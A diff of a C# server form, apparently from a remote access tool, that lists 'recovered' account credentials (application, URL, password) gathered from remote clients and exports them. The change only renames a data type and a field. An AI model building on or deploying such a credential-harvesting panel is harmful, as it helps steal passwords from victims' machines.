@@ -28,7 +28,7 @@ namespace Comet.Server.Forms
         /// <summary>
         /// Represents a value to display in the ListView when no results were found.
         /// </summary>
-        private readonly RecoveredAccount _noResultsFound = new RecoveredAccount()
+        private readonly SaveUser _noResultsFound = new SaveUser()
         {
             Application = "No Results Found",
             Url = "N/A",
@@ -54,7 +54,7 @@ namespace Comet.Server.Forms
         /// </summary>
         private void RegisterMessageHandler()
         {
-            //_connectClient.ClientState += ClientDisconnected;
+            //_clients.ClientState += ClientDisconnected;
             _recoveryHandler.AccountsRecovered += AddPasswords;
             MessageHandler.Register(_recoveryHandler);
         }
@@ -102,7 +102,7 @@ namespace Comet.Server.Forms
             _recoveryHandler.BeginAccountRecovery();
         }
 
-        private void AddPasswords(object sender, string clientIdentifier, List<RecoveredAccount> accounts)
+        private void AddPasswords(object sender, string clientIdentifier, List<SaveUser> accounts)
         {
             try
             {
@@ -162,7 +162,7 @@ namespace Comet.Server.Forms
             groupBox1.Text = $"Recovered Accounts [ {lstPasswords.Items.Count} ]";
         }
 
-        private string ConvertToFormat(string format, RecoveredAccount login)
+        private string ConvertToFormat(string format, SaveUser login)
         {
             return format
                 .Replace("APP", login.Application)
@@ -180,14 +180,14 @@ namespace Comet.Server.Forms
             {
                 foreach (ListViewItem lvi in lstPasswords.SelectedItems)
                 {
-                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
+                    sb.Append(ConvertToFormat(format, (SaveUser)lvi.Tag) + "\n");
                 }
             }
             else
             {
                 foreach (ListViewItem lvi in lstPasswords.Items)
                 {
-                    sb.Append(ConvertToFormat(format, (RecoveredAccount)lvi.Tag) + "\n");
+                    sb.Append(ConvertToFormat(format, (SaveUser)lvi.Tag) + "\n");
                 }
             }
 
